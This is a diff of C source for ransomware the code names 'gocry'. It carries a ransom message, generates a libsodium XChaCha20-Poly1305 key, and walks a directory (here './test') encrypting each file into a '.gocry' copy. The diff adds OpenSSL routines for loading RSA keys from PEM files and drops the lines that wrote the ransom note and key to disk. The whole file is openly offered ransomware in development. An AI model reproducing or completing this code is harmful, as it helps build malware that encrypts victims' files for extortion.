@@ -1,4 +1,6 @@
 #include <dirent.h>
+#include <openssl/ossl_typ.h>
+#include <openssl/rsa.h>
 #include <sodium.h>
 #include <sodium/crypto_secretstream_xchacha20poly1305.h>
 #include <stdio.h>
@@ -8,6 +10,24 @@
 
 const char *root_dir_path = "./test";
 const char *ransom_message = "You've been infected by gocry.\nAll your files are not encrypted\n";
+
+EVP_PKEY *ReadPrivKey_FromFile(char *filename, char *pass) {
+    FILE *fp = fopen(filename, "r");
+    EVP_PKEY *key = NULL;
+    PEM_read_PrivateKey(fp, &key, NULL, pass);
+    fclose(fp);
+
+    return key;
+}
+
+EVP_PKEY *ReadPubKey_FromFile(char *filename) {
+    FILE *fp = fopen(filename, "r");
+    EVP_PKEY *key = NULL;
+    PEM_read_PUBKEY(fp, &key, NULL, NULL);
+    fclose(fp);
+
+    return key;
+}
 
 static int encrypt(const char *encrypt_to, const char *source_file,
                    const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]) {
@@ -85,31 +105,37 @@ int main() {
     DIR *root_dir = opendir(root_dir_path);
     struct dirent *dir;
 
-    FILE *message_file = fopen("./message.txt", "w+");
-    if (message_file) {
-        fputs(ransom_message, message_file);
-    }
-
-    unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
-    crypto_secretstream_xchacha20poly1305_keygen(encryption_key);
-    FILE *key_file = fopen("./key.txt", "w+");
-    if (key_file) {
-        const char *temp = encryption_key;
-        fputs(temp, key_file);
-    }
+    char *to_encrypt[512];
+    int i = 0;
 
     if (root_dir) {
         while ((dir = readdir(root_dir)) != NULL) {
             if (!strcmp(dir->d_name, ".") || !strcmp(dir->d_name, "..")) {
                 continue;
             }
-            printf("%s\n", dir->d_name);
-            char *filename, *original;
-            sprintf(filename, "%s/%s.gocry", root_dir_path, dir->d_name);
-            sprintf(original, "%s/%s", root_dir_path, dir->d_name);
-            if (encrypt(filename, original, encryption_key) != 0)
-                printf("Error encrypting file %s", dir->d_name);
+            puts(dir->d_name);
+            to_encrypt[i] = dir->d_name;
+            ++i;
         }
         closedir(root_dir);
+    }
+
+    unsigned char encryption_key[crypto_secretstream_xchacha20poly1305_KEYBYTES];
+    crypto_secretstream_xchacha20poly1305_keygen(encryption_key);
+    for (int j = 0; j < i; ++j) {
+        char filename[512] = {0};
+        char original[512] = {0};
+
+        strcpy(filename, root_dir_path);
+        strcat(filename, "/");
+        strcat(filename, to_encrypt[j]);
+        strcat(filename, ".gocry");
+
+        strcpy(original, root_dir_path);
+        strcat(original, "/");
+        strcat(original, to_encrypt[j]);
+
+        if (encrypt(filename, original, encryption_key) != 0)
+            printf("Error encrypting file %s", to_encrypt[j]);
     }
 }
